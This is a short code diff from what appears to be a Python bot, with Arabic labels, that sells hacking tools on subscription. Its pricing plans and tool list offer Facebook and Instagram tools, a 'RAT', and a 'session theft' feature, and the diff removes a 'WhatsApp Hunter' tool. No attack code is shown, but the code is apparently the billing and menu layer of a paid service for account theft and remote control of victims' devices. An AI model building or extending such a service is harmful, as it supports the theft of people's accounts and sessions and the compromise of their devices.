@@ -27,7 +27,7 @@ PRICING_PLANS = {
         "stars": 150,
         "days": 30,
         "daily_limit": 100,
-        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH", "WhatsApp Hunter"]
+        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH"]
     },
     "vip": {
         "name": "باقة VIP",
@@ -39,7 +39,7 @@ PRICING_PLANS = {
 }
 
 FREE_TRIAL_USES = 1
-AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "wa"]
+AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
 
 # ============================================================
 # [2] Redis
@@ -231,7 +231,6 @@ def build_account_text(user_id):
         "rat": "RAT",
         "lsh": "LSH",
         "sh": "سرقة الجلسات",
-        "wa": "WhatsApp Hunter",
     }
 
     trial_lines = []
